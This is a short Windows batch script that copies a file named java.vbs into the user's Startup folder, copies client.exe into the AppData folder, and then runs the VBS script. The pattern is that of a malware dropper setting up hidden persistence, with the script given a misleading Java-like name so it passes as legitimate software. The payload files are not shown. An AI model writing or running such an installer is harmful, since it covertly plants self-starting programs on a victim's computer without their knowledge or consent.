@echo off
copy java.vbs "%appdata%/Microsoft\Windows\Start Menu\Programs\StartUp"
copy client.exe "%appdata%"
"%appdata%/Microsoft\Windows\Start Menu\Programs\StartUp\java.vbs"
